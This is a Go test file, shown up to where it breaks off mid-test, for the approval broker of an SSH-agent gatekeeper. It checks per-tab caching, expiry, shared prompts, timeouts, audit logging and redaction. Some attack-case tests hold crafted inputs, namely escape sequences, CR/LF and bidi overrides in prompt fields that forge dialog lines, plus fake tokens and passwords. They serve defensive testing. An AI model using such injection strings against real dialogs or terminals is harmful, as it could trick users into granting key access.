package broker

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
	"unicode"

	"go.yaml.in/yaml/v3"

	"github.com/atas/nazar/core/approval"
	"github.com/atas/nazar/core/audit"
	"github.com/atas/nazar/core/caller"
	"github.com/atas/nazar/core/config"
	"github.com/atas/nazar/core/match"
	"github.com/atas/nazar/core/platform"
	"github.com/atas/nazar/core/platform/fake"
	"github.com/atas/nazar/core/policy"
	"github.com/atas/nazar/core/trust"
)

var t0 = time.Date(2026, 10, 4, 0, 0, 0, 0, time.UTC)

const cfgSrc = `apiVersion: nazar/v1
kind: Config
apps:
  claude: {signed: {team: Q6L2SF6YDW, id: com.anthropic.claude-code}}
  iterm: {app: com.googlecode.iterm2}
ssh_agent:
  keys:
    github:
      rules:
        - apps: [claude]
          scope: session
          gate: dialog
        - apps: [iterm]
          scope: session
          gate: login
          expire: 8h
    deploy:
      rules:
        - apps: [iterm]
          gate: none
    unk:
      rules:
        - apps: [unknown]
          scope: session
          gate: dialog
`

type env struct {
	f     *fake.Fake
	b     *Broker
	cache *approval.Cache
	sink  *audit.MemorySink
	r     *caller.Resolver
	m     *match.Evaluator
	eng   atomic.Pointer[policy.Engine]
	calls atomic.Int32
}

func newEnv(t *testing.T) *env {
	t.Helper()
	return newEnvWith(t, cfgSrc, 200*time.Millisecond)
}

func mustParse(t *testing.T, src string) *config.Config {
	t.Helper()
	cfg, probs := config.Parse([]byte(src), config.Env{Home: "/Users/u"})
	if probs.HasErrors() {
		t.Fatal(probs.Error())
	}
	return cfg
}

// newEnvWith builds a broker over src. timeout 0 leaves Options.Timeout nil,
// so the config's defaults.timeout applies.
func newEnvWith(t *testing.T, src string, timeout time.Duration) *env {
	t.Helper()
	cfg := mustParse(t, src)
	f := fake.New(t0)
	st, err := trust.Open(fake.NewVault())
	if err != nil {
		t.Fatal(err)
	}
	// As config approval does (spec 4.2): iTerm2's team is pinned from
	// the installed app when the config is approved, never while matching.
	if _, err := st.Pin("com.googlecode.iterm2", fake.ITermCode.Team()); err != nil {
		t.Fatal(err)
	}
	e := &env{f: f, sink: &audit.MemorySink{}, r: &caller.Resolver{P: f}, m: &match.Evaluator{Trust: st}}
	e.eng.Store(policy.New(cfg, e.m))
	e.cache = approval.New(f.Now, f.ReleaseApproval)
	o := Options{
		Platform: f, Cache: e.cache, Audit: audit.NewLogger(e.sink, audit.Formatter{Home: "/Users/u"}, nil),
		Engine: func() *policy.Engine { return e.eng.Load() }, Now: f.Now, Home: "/Users/u",
	}
	if timeout > 0 {
		o.Timeout = func() time.Duration { return timeout }
	}
	e.b = New(o)
	return e
}

// reload swaps the active policy, as the daemon does on a config change.
func (e *env) reload(t *testing.T, src string) {
	t.Helper()
	e.eng.Store(policy.New(mustParse(t, src), e.m))
}

func (e *env) req(key string, peer platform.ProcessRef) Request {
	return Request{
		Key: key, Chain: e.r.Resolve(peer), Summary: "login to github.com as git", Destination: "github.com",
		Op: approval.Op{ID: "login:SHA256:gh", Text: "github.com"},
		Do: func(platform.ApprovalRef) error { e.calls.Add(1); return nil },
	}
}

func (e *env) lastLine(t *testing.T) map[string]string {
	t.Helper()
	lines := e.sink.Lines()
	if len(lines) == 0 {
		t.Fatal("no audit line")
	}
	f, err := audit.ParseLine(lines[len(lines)-1])
	if err != nil {
		t.Fatal(err)
	}
	return f
}

func TestSessionApprovalIsRememberedPerTab(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc(), fake.SSHProc("git@github.com"))
	if r := e.b.Handle(e.req("github", tab.Peer())); r.Decision != audit.Approved {
		t.Fatalf("first: %+v", r)
	}
	again := e.f.Launch(tab.Procs[0], fake.SSHProc("git@github.com"))
	if r := e.b.Handle(e.req("github", again)); r.Decision != audit.Allowed || r.Reason != "cached approval" {
		t.Fatalf("same tab: %+v", r)
	}
	if n := e.f.CountShown(fake.KindConfirm); n != 1 {
		t.Fatalf("dialogs shown %d, want 1", n)
	}
	other := e.f.ITermTab(tab.App, fake.ClaudeProc(), fake.SSHProc("git@github.com"))
	e.b.Handle(e.req("github", other.Peer()))
	if n := e.f.CountShown(fake.KindConfirm); n != 2 {
		t.Fatalf("a new tab must prompt again (shown %d)", n)
	}
	if e.calls.Load() != 3 {
		t.Fatalf("Do ran %d times", e.calls.Load())
	}
	f := e.lastLine(t)
	if f["decision"] != "approved" || f["rule"] != "1" || f["scope"] != "session" || f["gate"] != "dialog" || f["destination"] != "github.com" {
		t.Fatalf("audit %v", f)
	}
	if !strings.Contains(f["chain"], "claude(") || !strings.Contains(f["chain"], "Q6L2SF6YDW:com.anthropic.claude-code") {
		t.Fatalf("chain %q", f["chain"])
	}
}

func TestApprovalsArePerRule(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc(), fake.SSHProc("h"))
	e.b.Handle(e.req("github", tab.Peer())) // rule 1, dialog
	plain := e.f.Launch(tab.Shell, fake.SSHProc("h"))
	if r := e.b.Handle(e.req("github", plain)); r.Decision != audit.Approved || r.Outcome.RuleIndex != 2 {
		t.Fatalf("rule 2 must not reuse rule 1's approval: %+v", r)
	}
	if e.f.CountShown(fake.KindAuthenticate) != 1 {
		t.Fatal("login prompt expected for rule 2")
	}
}

func TestSessionExitRevokes(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	e.b.Handle(e.req("github", tab.Peer()))
	if len(e.cache.List()) != 1 || e.f.LiveApprovals() != 1 {
		t.Fatal("login approval must be cached with its ref")
	}
	e.f.Exit(tab.Shell)
	if len(e.cache.List()) != 0 || e.f.LiveApprovals() != 0 {
		t.Fatal("closing the tab must remove the approval and release its LAContext")
	}
}

func TestExpiry(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	e.b.Handle(e.req("github", tab.Peer()))
	e.f.Advance(8 * time.Hour)
	if r := e.b.Handle(e.req("github", tab.Peer())); r.Decision != audit.Approved {
		t.Fatalf("expired approval reused: %+v", r)
	}
	if e.f.CountShown(fake.KindAuthenticate) != 2 {
		t.Fatal("must prompt again after expire")
	}
}

func TestConcurrentRequestsShareOnePrompt(t *testing.T) {
	e := newEnv(t)
	release := make(chan struct{})
	e.f.ScriptConfirm(fake.Answer{Allow: true, Wait: release})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc())
	var wg sync.WaitGroup
	results := make([]Result, 5)
	for i := range results {
		peer := e.f.Launch(tab.Procs[0], fake.SSHProc("h"))
		wg.Add(1)
		go func(i int) { defer wg.Done(); results[i] = e.b.Handle(e.req("github", peer)) }(i)
	}
	time.Sleep(50 * time.Millisecond)
	close(release)
	wg.Wait()
	approved := 0
	for _, r := range results {
		if !r.Allowed() {
			t.Fatalf("%+v", r)
		}
		if r.Decision == audit.Approved {
			approved++
		}
	}
	if e.f.CountShown(fake.KindConfirm) != 1 || approved != 1 || e.calls.Load() != 5 {
		t.Fatalf("shown %d approved %d calls %d", e.f.CountShown(fake.KindConfirm), approved, e.calls.Load())
	}
}

func TestDeniedSharedPrompt(t *testing.T) {
	e := newEnv(t)
	release := make(chan struct{})
	e.f.ScriptConfirm(fake.Answer{Allow: false, Wait: release})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc())
	var wg sync.WaitGroup
	var denied atomic.Int32
	for i := 0; i < 3; i++ {
		peer := e.f.Launch(tab.Procs[0], fake.SSHProc("h"))
		wg.Add(1)
		go func() {
			defer wg.Done()
			if r := e.b.Handle(e.req("github", peer)); r.Decision == audit.Denied {
				denied.Add(1)
			}
		}()
	}
	time.Sleep(50 * time.Millisecond)
	close(release)
	wg.Wait()
	if denied.Load() != 3 || e.calls.Load() != 0 || len(e.cache.List()) != 0 {
		t.Fatalf("denied %d calls %d", denied.Load(), e.calls.Load())
	}
}

func TestTimeoutDeniesAndReleasesLateApproval(t *testing.T) {
	e := newEnv(t)
	release := make(chan struct{})
	e.f.ScriptAuth(fake.Answer{Allow: true, Wait: release})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	r := e.b.Handle(e.req("github", tab.Peer()))
	if r.Decision != audit.Timeout || e.calls.Load() != 0 {
		t.Fatalf("%+v", r)
	}
	close(release)
	deadline := time.Now().Add(time.Second)
	for e.f.LiveApprovals() != 0 || len(e.f.Released()) != 1 {
		if time.Now().After(deadline) {
			t.Fatal("late approval was not released")
		}
		time.Sleep(5 * time.Millisecond)
	}
	if e.lastLine(t)["decision"] != "timeout" {
		t.Fatal("timeout not audited")
	}
}

func TestBlockedWarnsWithoutPromptAndDedupes(t *testing.T) {
	e := newEnv(t)
	term := e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal", Code: fake.AppleCode("com.apple.Terminal"), App: &fake.App{BundleID: "com.apple.Terminal", Name: "Terminal"}})
	py := e.f.Launch(term, fake.Proc{Path: "/usr/bin/python3", Args: []string{"python3", "sync.py", "--token=ghp_abcdefghijklmnop"}, Cwd: "/Users/u/projects/foo", Code: fake.AppleCode("com.apple.python3")})
	for i := 0; i < 3; i++ {
		peer := e.f.Launch(py, fake.SSHProc("h"))
		if r := e.b.Handle(e.req("github", peer)); r.Decision != audit.Blocked || r.Reason != "no rule matched" {
			t.Fatalf("%+v", r)
		}
	}
	if len(e.f.Shown()) != 0 || e.calls.Load() != 0 {
		t.Fatal("a blocked request must never prompt or sign")
	}
	w := e.f.Warnings()
	if len(w) != 3 || w[0].ID != w[2].ID || w[2].Count != 3 {
		t.Fatalf("warnings %+v", w)
	}
	if strings.Contains(strings.Join(w[2].Lines, "\n"), "times") || !strings.Contains(w[2].SuggestedRule, "app: com.apple.Terminal") {
		t.Fatalf("warning %+v", w[2])
	}
	e.f.Advance(10 * time.Minute)
	e.b.Handle(e.req("github", e.f.Launch(py, fake.SSHProc("h"))))
	if w := e.f.Warnings(); w[len(w)-1].Count != 1 {
		t.Fatal("after the window a new warning starts")
	}
	if f := e.lastLine(t); f["decision"] != "blocked" || f["rule"] != "fallback" || strings.Contains(e.sink.Lines()[0], "ghp_abc") {
		t.Fatalf("audit %v", e.sink.Lines()[0])
	}
}

func TestGateNoneIsSilent(t *testing.T) {
	e := newEnv(t)
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	if r := e.b.Handle(e.req("deploy", tab.Peer())); r.Decision != audit.Allowed || len(e.f.Shown()) != 0 || e.calls.Load() != 1 {
		t.Fatalf("%+v", r)
	}
}

func TestUnknownChainPromptsEveryTime(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{}, fake.Answer{Allow: true})
	mux := e.f.Launch(platform.ProcessRef{}, fake.SSHProc("[mux]"))
	for i := 0; i < 2; i++ {
		if r := e.b.Handle(e.req("unk", mux)); r.Decision != audit.Approved {
			t.Fatalf("%+v", r)
		}
	}
	shown := e.f.Shown()
	if len(shown) != 2 || !shown[0].Prompt.Unknown || !strings.HasPrefix(shown[0].Prompt.Title, "Unknown app wants") {
		t.Fatalf("shown %+v", shown)
	}
	// The Unknown-app header comes first; the command line is still marked.
	if p := shown[0].Prompt; p.CommandLine != 3 || !strings.HasPrefix(p.Lines[0], "Unknown app:") {
		t.Fatalf("CommandLine %d in %q", p.CommandLine, p.Lines)
	}
	if len(e.cache.List()) != 0 {
		t.Fatal("unknown chains are never cached")
	}
}

func TestPromptContent(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.Proc{Path: "/usr/bin/git", Args: []string{"git", "push", "origin", "main"}, Cwd: "/Users/u/projects/foo", Code: fake.AppleCode("com.apple.git")}, fake.Proc{Path: "/usr/bin/ssh", Args: []string{"ssh", "git@github.com", "--token=ghp_secretsecret1\x1b[2J"}, Cwd: "/Users/u/projects/foo", Code: fake.AppleCode("com.apple.openssh")})
	e.b.Handle(e.req("github", tab.Peer()))
	p := e.f.Shown()[0].Prompt
	text := p.Title + "\n" + strings.Join(p.Lines, "\n")
	// Spec 4.4's example dialog, line for line: the command is what the user
	// ran (git), not the ssh that git started.
	for _, want := range []string{`iTerm2 wants to use key "github"`, "login to github.com as git", "git push origin main    in ~/projects/foo", "chain: iTerm2 → bash → git → ssh", "Scope: this terminal session, for github.com only (expires in 8h0m0s)"} {
		if !strings.Contains(text, want) {
			t.Errorf("prompt missing %q:\n%s", want, text)
		}
	}
	// The command line is marked, so the dialog shows it as code.
	if p.CommandLine < 1 || p.Lines[p.CommandLine-1] != "git push origin main    in ~/projects/foo" {
		t.Errorf("CommandLine %d does not name the command in %q", p.CommandLine, p.Lines)
	}
	if strings.Contains(text, "secretsecret") || strings.Contains(text, "\x1b") {
		t.Fatalf("prompt leaks a token or control characters:\n%q", text)
	}
	if p.Timeout != 200*time.Millisecond || !strings.Contains(p.Reason, `"github"`) {
		t.Fatalf("%+v", p)
	}
}

func TestSignFailureIsAnError(t *testing.T) {
	e := newEnv(t)
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	req := e.req("deploy", tab.Peer())
	req.Do = func(platform.ApprovalRef) error { return platform.ErrAuthRequired }
	if r := e.b.Handle(req); r.Decision != audit.Error || !strings.Contains(r.Reason, "login gate") {
		t.Fatalf("%+v", r)
	}
}

func TestLoginForControlActions(t *testing.T) {
	e := newEnv(t)
	e.f.ScriptAuth(fake.Answer{Allow: true}, fake.Answer{Allow: false})
	if d, _ := e.b.Login(platform.Prompt{Title: "Trust /opt/homebrew/bin/kubectl?"}); d != audit.Approved {
		t.Fatalf("got %v", d)
	}
	if d, r := e.b.Login(platform.Prompt{Title: "again"}); d != audit.Denied || r != "user denied" {
		t.Fatalf("got %v %v", d, r)
	}
	if e.f.LiveApprovals() != 0 {
		t.Fatal("control approvals must be released at once")
	}
}

// Attack: the config-change dialog shows the new rule to the user (spec 4.8,
// section 8: malware editing config.yaml). Matcher values in it are
// attacker-chosen, so Login must clean its prompt exactly like key prompts:
// no injected line, escape sequence or bidi override reaches the platform,
// and the caller's own slice is left untouched.
func TestLoginSanitizesPromptText(t *testing.T) {
	e := newEnv(t)
	e.f.ScriptAuth(fake.Answer{Allow: true})
	lines := []string{"a\nb‮", "rule: signed:EVIL\x1b[2J\r\nScope: granted"}
	orig := append([]string(nil), lines...)
	in := platform.Prompt{
		Title:  "Trust /opt/x?\x1b[2J\nApply config: yes",
		Lines:  lines,
		Reason: "apply config\n‮ok",
	}
	if d, _ := e.b.Login(in); d != audit.Approved {
		t.Fatalf("got %v", d)
	}
	shown := e.f.Shown()
	if len(shown) != 1 {
		t.Fatalf("shown %d prompts", len(shown))
	}
	p := shown[0].Prompt
	noControl(t, "title", p.Title)
	noControl(t, "reason", p.Reason)
	if len(p.Lines) != len(lines) {
		t.Fatalf("lines %d, want %d", len(p.Lines), len(lines))
	}
	for i, l := range p.Lines {
		noControl(t, fmt.Sprintf("line %d", i), l)
	}
	if strings.Contains(p.Title, "Apply config") && strings.Count(p.Title, "?") < 2 {
		t.Fatalf("control characters not replaced in title: %q", p.Title)
	}
	for i := range lines {
		if lines[i] != orig[i] {
			t.Fatalf("Login mutated the caller's slice: %q", lines[i])
		}
	}
	// A title longer than the line budget is cut, not shown in full.
	e.f.ScriptAuth(fake.Answer{Allow: true})
	if d, _ := e.b.Login(platform.Prompt{Title: strings.Repeat("x", 2*maxLine)}); d != audit.Approved {
		t.Fatalf("got %v", d)
	}
	if long := e.f.Shown()[1].Prompt.Title; len([]rune(long)) > maxLine+1 {
		t.Fatalf("title not cut: %d runes", len([]rune(long)))
	}
	if p := e.f.Shown()[0]; p.Kind != fake.KindAuthenticate || p.Prompt.Timeout != 200*time.Millisecond {
		t.Fatalf("%+v", p)
	}
}

func TestForwardedRequestsAreNeverCached(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc(), fake.SSHProc("h"))
	e.b.Handle(e.req("github", tab.Peer())) // local approval for this tab
	fwd := e.req("github", tab.Peer())
	fwd.Forwarded = true
	if r := e.b.Handle(fwd); r.Decision != audit.Approved || r.Reason != "approved for this request" {
		t.Fatalf("a forwarded request must not use the tab's approval: %+v", r)
	}
	if n := e.f.CountShown(fake.KindConfirm); n != 2 {
		t.Fatalf("dialogs %d, want 2", n)
	}
	if len(e.cache.List()) != 1 {
		t.Fatal("a forwarded approval must not be remembered")
	}
}

// ---------------------------------------------------------------------------
// Additional behaviour, edge and attack cases (spec 4.2, 4.3, 4.4, 4.6, 9).
// ---------------------------------------------------------------------------

// moreCfg exercises scope: app, to: receivers, an explicit block rule, a key
// whose own policy prompts every caller, and a configured defaults.timeout.
const moreCfg = `apiVersion: nazar/v1
kind: Config
defaults:
  timeout: 30s
apps:
  claude: {signed: {team: Q6L2SF6YDW, id: com.anthropic.claude-code}}
  iterm: {app: com.googlecode.iterm2}
ssh_agent:
  keys:
    appkey:
      rules:
        - apps: [iterm]
          scope: app
          gate: dialog
    recv:
      rules:
        - apps: [iterm]
          to: [{signed: {team: apple}}]
          scope: session
          gate: dialog
    guarded:
      rules:
        - apps: [claude]
          gate: block
        - apps: [iterm]
          scope: session
          gate: dialog
    userkey:
      scope: use
      gate: login
`

// noControl fails when s holds anything that is not printable: control
// characters (newline, ESC, CR) and format characters such as U+202E could
// forge or hide lines on screen.
func noControl(t *testing.T, what, s string) {
	t.Helper()
	for _, r := range s {
		if !unicode.IsPrint(r) {
			t.Errorf("%s contains non-printable %U: %q", what, r, s)
			return
		}
	}
}

func promptText(p platform.Prompt) string {
	return p.Title + "\n" + strings.Join(p.Lines, "\n")
}

func waitFor(t *testing.T, what string, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for !cond() {
		if time.Now().After(deadline) {
			t.Fatal(what)
		}
		time.Sleep(5 * time.Millisecond)
	}
}

// Spec 4.6: every request writes exactly one audit line, whatever happens to
// it, and the line's decision is the request's decision.
func TestExactlyOneAuditLinePerRequest(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc(), fake.SSHProc("h"))
	plain := e.f.ITermTab(tab.App, fake.SSHProc("h"))
	stray := e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: "/tmp/stray", Code: fake.Unsigned})
	var got []Result
	got = append(got, e.b.Handle(e.req("github", tab.Peer())))   // approved (dialog)
	got = append(got, e.b.Handle(e.req("github", tab.Peer())))   // allowed (cached)
	got = append(got, e.b.Handle(e.req("deploy", plain.Peer()))) // allowed (none)
	got = append(got, e.b.Handle(e.req("github", stray)))        // blocked
	e.f.ScriptConfirm(fake.Answer{Allow: false})
	other := e.f.ITermTab(tab.App, fake.ClaudeProc(), fake.SSHProc("h"))
	got = append(got, e.b.Handle(e.req("github", other.Peer()))) // denied
	failing := e.req("deploy", plain.Peer())
	failing.Do = func(platform.ApprovalRef) error { return errors.New("enclave unavailable") }
	got = append(got, e.b.Handle(failing)) // error
	lines := e.sink.Lines()
	if len(lines) != len(got) {
		t.Fatalf("%d requests wrote %d audit lines:\n%s", len(got), len(lines), strings.Join(lines, "\n"))
	}
	want := []audit.Decision{audit.Approved, audit.Allowed, audit.Allowed, audit.Blocked, audit.Denied, audit.Error}
	for i, r := range got {
		if r.Decision != want[i] {
			t.Errorf("request %d: decision %v, want %v (%+v)", i, r.Decision, want[i], r)
		}
		f, err := audit.ParseLine(lines[i])
		if err != nil {
			t.Fatalf("line %d unparseable: %v\n%s", i, err, lines[i])
		}
		if f["decision"] != string(r.Decision) || f["target"] != r.Outcome.Target {
			t.Errorf("line %d %v does not match result %+v", i, f, r)
		}
	}
	if f, _ := audit.ParseLine(lines[1]); f["reason"] != "cached approval" {
		t.Errorf("cached request reason %q", f["reason"])
	}
	if f, _ := audit.ParseLine(lines[2]); f["gate"] != "none" || f["decision"] != "allowed" {
		t.Errorf("gate none line %v", f)
	}
	if f, _ := audit.ParseLine(lines[5]); !strings.Contains(f["reason"], "enclave unavailable") {
		t.Errorf("error reason %q", f["reason"])
	}
}

// Concurrent requests each get their own line, even when they share a prompt.
func TestConcurrentRequestsEachAudited(t *testing.T) {
	e := newEnv(t)
	release := make(chan struct{})
	e.f.ScriptConfirm(fake.Answer{Allow: true, Wait: release})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc())
	var wg sync.WaitGroup
	for i := 0; i < 4; i++ {
		peer := e.f.Launch(tab.Procs[0], fake.SSHProc("h"))
		wg.Add(1)
		go func() { defer wg.Done(); e.b.Handle(e.req("github", peer)) }()
	}
	time.Sleep(50 * time.Millisecond)
	close(release)
	wg.Wait()
	if n := len(e.sink.Lines()); n != 4 {
		t.Fatalf("4 requests wrote %d lines", n)
	}
}

// Spec 4.6: audit lines carry the request's identity fields and never a full
// command line: the receiver's argv goes through the allowlist redaction.
func TestAuditFieldsAndRedaction(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	ssh := fake.Proc{Path: "/usr/bin/ssh", Args: []string{"ssh", "-p2222", "deploy@prod", "--password=hunter2hunter2", "ls"}, Cwd: "/Users/u/projects/foo", Code: fake.AppleCode("com.apple.openssh")}
	tab := e.f.ITermTab(platform.ProcessRef{}, ssh)
	req := e.req("github", tab.Peer())
	req.Operation = "sign git commit"
	r := e.b.Handle(req)
	if r.Decision != audit.Approved {
		t.Fatalf("%+v", r)
	}
	line := e.sink.Lines()[0]
	for _, secret := range []string{"hunter2", "deploy@prod", "p2222", "2222"} {
		if strings.Contains(line, secret) {
			t.Fatalf("audit line leaks %q: %s", secret, line)
		}
	}
	f := e.lastLine(t)
	chain := e.r.Resolve(tab.Peer())
	checks := map[string]string{
		"target": "ssh:github", "rule": "2", "scope": "session", "gate": "login",
		"app": "com.googlecode.iterm2", "session": chain.Session.String(),
		"destination": "github.com", "operation": "sign git commit", "cwd": "~/projects/foo",
	}
	for k, want := range checks {
		if f[k] != want {
			t.Errorf("%s = %q, want %q (line %s)", k, f[k], want, line)
		}
	}
	if !strings.HasPrefix(f["receiver"], "ssh") || !strings.Contains(f["receiver"], "ls") || !strings.Contains(f["receiver"], audit.Elided) {
		t.Errorf("receiver %q: want the redacted argv", f["receiver"])
	}
	procs, err := audit.ParseChain(f["chain"])
	if err != nil || len(procs) == 0 || procs[0].Name != "bash" || procs[len(procs)-1].Name != "ssh" {
		t.Errorf("chain %q (%v): want the command below the app, bash … ssh", f["chain"], err)
	}
	for _, p := range procs {
		if p.Name == "iTerm2" || p.Name == "login" || strings.HasPrefix(p.Name, "iTermServer") {
			t.Errorf("chain %q includes the app or its helpers", f["chain"])
		}
	}
}

// Spec 4.3: the sign operation runs with the login gate's approval, so a key
// with Secure Enclave user presence can sign; a cached approval reuses it;
// dialog approvals carry no ref.
func TestDoGetsTheApprovalRef(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	plain := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	var refs []platform.ApprovalRef
	var liveDuring []int
	sign := func(peer platform.ProcessRef, key string) Result {
		r := e.req(key, peer)
		r.Do = func(ref platform.ApprovalRef) error {
			refs = append(refs, ref)
			liveDuring = append(liveDuring, e.f.LiveApprovals())
			return nil
		}
		return e.b.Handle(r)
	}
	sign(plain.Peer(), "github") // login, remembered
	sign(e.f.Launch(plain.Shell, fake.SSHProc("h")), "github")
	if len(refs) != 2 || refs[0] == 0 || refs[1] != refs[0] {
		t.Fatalf("login refs %v: want one non-zero ref reused from the cache", refs)
	}
	if liveDuring[0] != 1 {
		t.Fatal("the login approval must be live while signing")
	}
	claude := e.f.ITermTab(plain.App, fake.ClaudeProc(), fake.SSHProc("h"))
	sign(claude.Peer(), "github") // dialog
	if refs[2] != 0 {
		t.Fatalf("dialog gate passed ref %v", refs[2])
	}
	sign(plain.Peer(), "deploy") // none
	if refs[3] != 0 {
		t.Fatalf("gate none passed ref %v", refs[3])
	}
}

// A one-shot login approval (scope: use) signs with its ref and is released
// right after, never kept.
func TestOneShotLoginIsReleased(t *testing.T) {
	e := newEnvWith(t, moreCfg, 200*time.Millisecond)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	var got platform.ApprovalRef
	for i := 0; i < 2; i++ {
		req := e.req("userkey", tab.Peer())
		req.Do = func(ref platform.ApprovalRef) error { got = ref; return nil }
		if r := e.b.Handle(req); r.Decision != audit.Approved {
			t.Fatalf("%+v", r)
		}
		if got == 0 {
			t.Fatal("scope use login must sign with its approval")
		}
	}
	if e.f.CountShown(fake.KindAuthenticate) != 2 || len(e.cache.List()) != 0 {
		t.Fatal("scope: use asks every time and remembers nothing")
	}
	if e.f.LiveApprovals() != 0 || len(e.f.Released()) != 2 {
		t.Fatalf("one-shot approvals must be released (live %d)", e.f.LiveApprovals())
	}
	// userkey has no rules: its own gate applied.
	if f := e.lastLine(t); f["rule"] != RuleKeyGate || f["scope"] != "use" || f["gate"] != "login" {
		t.Fatalf("audit %v", f)
	}
}

func TestDeniedIsNotRemembered(t *testing.T) {
	e := newEnv(t)
	e.f.ScriptConfirm(fake.Answer{Allow: false})
	e.f.SetDefaults(fake.Answer{}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc(), fake.SSHProc("h"))
	r := e.b.Handle(e.req("github", tab.Peer()))
	if r.Decision != audit.Denied || r.Reason != "user denied" || r.Allowed() || e.calls.Load() != 0 {
		t.Fatalf("%+v", r)
	}
	if len(e.cache.List()) != 0 {
		t.Fatal("a denial must not be remembered")
	}
	if r := e.b.Handle(e.req("github", tab.Peer())); r.Decision != audit.Approved {
		t.Fatalf("after a denial the next request asks again: %+v", r)
	}
	if e.f.CountShown(fake.KindConfirm) != 2 {
		t.Fatal("want a second dialog")
	}
}

// A gate that fails (not a user denial) is an error, never an approval.
func TestGateErrorFailsClosed(t *testing.T) {
	e := newEnv(t)
	e.f.ScriptAuth(fake.Answer{Allow: true, Err: errors.New("LocalAuthentication unavailable")})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	r := e.b.Handle(e.req("github", tab.Peer()))
	if r.Decision != audit.Error || r.Allowed() || e.calls.Load() != 0 || len(e.cache.List()) != 0 {
		t.Fatalf("%+v", r)
	}
	if !strings.Contains(r.Reason, "LocalAuthentication unavailable") {
		t.Fatalf("reason %q", r.Reason)
	}
}

func TestDoFailureIsNotAllowed(t *testing.T) {
	e := newEnv(t)
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	req := e.req("deploy", tab.Peer())
	req.Do = func(platform.ApprovalRef) error { return errors.New("handle unusable") }
	r := e.b.Handle(req)
	if r.Allowed() || r.Decision != audit.Error || !strings.Contains(r.Reason, "handle unusable") {
		t.Fatalf("%+v", r)
	}
}

// Spec 4.4: one shared prompt per (target, rule, scope, receiver); different
// tabs are different scopes and get their own prompts.
func TestDifferentScopesDoNotSharePrompts(t *testing.T) {
	e := newEnv(t)
	release := make(chan struct{})
	e.f.SetGateFuncs(nil, func(platform.Prompt) fake.Answer { return fake.Answer{Allow: true, Wait: release} })
	tabs := []fake.Chain{
		e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc()),
	}
	tabs = append(tabs, e.f.ITermTab(tabs[0].App, fake.ClaudeProc()))
	var wg sync.WaitGroup
	results := make([]Result, 4)
	for i := range results {
		peer := e.f.Launch(tabs[i%2].Procs[0], fake.SSHProc("h"))
		wg.Add(1)
		go func(i int) { defer wg.Done(); results[i] = e.b.Handle(e.req("github", peer)) }(i)
	}
	time.Sleep(50 * time.Millisecond)
	close(release)
	wg.Wait()
	for _, r := range results {
		if !r.Allowed() {
			t.Fatalf("%+v", r)
		}
	}
	if n := e.f.CountShown(fake.KindConfirm); n != 2 {
		t.Fatalf("two tabs, %d dialogs: want one per tab", n)
	}
	if len(e.cache.List()) != 2 {
		t.Fatalf("cache %+v", e.cache.List())
	}
}

// Spec 4.4: an unanswered prompt shared by several requests denies all of
// them; nothing is signed or remembered and the late approval is released.
func TestSharedPromptTimeout(t *testing.T) {
	e := newEnv(t)
	release := make(chan struct{})
	e.f.ScriptAuth(fake.Answer{Allow: true, Wait: release})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	var wg sync.WaitGroup
	results := make([]Result, 3)
	for i := range results {
		peer := e.f.Launch(tab.Shell, fake.SSHProc("h"))
		wg.Add(1)
		go func(i int) { defer wg.Done(); results[i] = e.b.Handle(e.req("github", peer)) }(i)
	}
	wg.Wait()
	timeouts := 0
	for _, r := range results {
		if r.Allowed() {
			t.Fatalf("a timed-out prompt allowed a request: %+v", r)
		}
		if r.Decision == audit.Timeout {
			timeouts++
		}
	}
	if timeouts == 0 || e.calls.Load() != 0 || len(e.cache.List()) != 0 {
		t.Fatalf("timeouts %d calls %d cache %d", timeouts, e.calls.Load(), len(e.cache.List()))
	}
	close(release)
